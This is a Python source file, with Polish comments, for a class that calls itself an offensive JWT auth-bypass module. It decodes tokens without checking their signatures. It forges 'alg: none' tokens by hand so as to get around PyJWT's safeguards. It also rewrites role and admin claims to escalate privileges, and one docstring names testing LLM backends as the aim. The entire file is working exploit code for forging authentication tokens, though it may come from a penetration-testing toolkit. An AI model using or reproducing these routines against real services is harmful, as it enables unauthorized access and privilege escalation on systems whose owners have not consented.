import jwt
import structlog
import base64
import json
from typing import Optional, Dict, Any

logger = structlog.get_logger(__name__)

class JWTAnalyzer:
    """Moduł ofensywny do analizy i manipulacji tokenami JWT (Auth Bypass)."""

    @staticmethod
    def decode_unsafe(token: str) -> Optional[Dict[str, Any]]:
        """
        Dekoduje payload JWT bez weryfikacji podpisu.
        Służy do mapowania struktury ról (Role Matrix) wewnątrz tokenu.
        """
        # Ochrona przed CPU Exhaustion (Max 8KB dla tokenu)
        if len(token) > 8192:
            logger.warning("JWT token rejected: length limit exceeded (8,192 characters). Potential DoS attack.")
            return None
            
        try:
            return jwt.decode(token, options={"verify_signature": False})
        except (jwt.DecodeError, RecursionError, ValueError) as e:
            logger.error("Invalid JWT format", error=str(e))
            return None

    @staticmethod
    def create_none_algorithm_token(token: str) -> Optional[str]:
        """
        Generuje token z algorytmem 'none' (Algorithm Confusion Attack).
        Weryfikuje, czy backend LLM akceptuje tokeny bez kryptograficznego podpisu.
        """
        payload = JWTAnalyzer.decode_unsafe(token)
        if not payload:
            return None

        try:
            # Ręczne budowanie tokenu omija restrykcje biblioteki PyJWT >= 2.0
            header_b64 = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode('utf-8').rstrip('=')
            payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode('utf-8')).decode('utf-8').rstrip('=')
            return f"{header_b64}.{payload_b64}."
        except Exception as e:
            logger.error("Error while generating the token 'none'", error=str(e))
            return None

    @staticmethod
    def elevate_privileges(token: str, target_role: str = "admin") -> Optional[str]:
        """
        Modyfikuje payload, podnosząc uprawnienia (Privilege Escalation),
        a następnie podpisuje go algorytmem 'none'.
        """
        payload = JWTAnalyzer.decode_unsafe(token)
        if not payload:
            return None

        # Szuka standardowych kluczy definiujących uprawnienia
        role_keys = ["role", "roles", "group", "permissions", "is_admin", "admin"]
        modified = False

        for key in role_keys:
            if key in payload:
                if isinstance(payload[key], list):
                    payload[key] = [target_role]
                elif isinstance(payload[key], bool):
                    payload[key] = True
                else:
                    payload[key] = target_role
                modified = True

        # Jeśli nie znaleziono standardowego klucza, wstrzykuje własny 
        if not modified:
            payload["role"] = target_role

        try:
            # Ręczne budowanie tokenu omija restrykcje PyJWT >= 2.0
            header_b64 = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode('utf-8').rstrip('=')
            payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode('utf-8')).decode('utf-8').rstrip('=')
            return f"{header_b64}.{payload_b64}."
        except Exception as e:
            logger.error("Error while elevating privileges", error=str(e))
            return None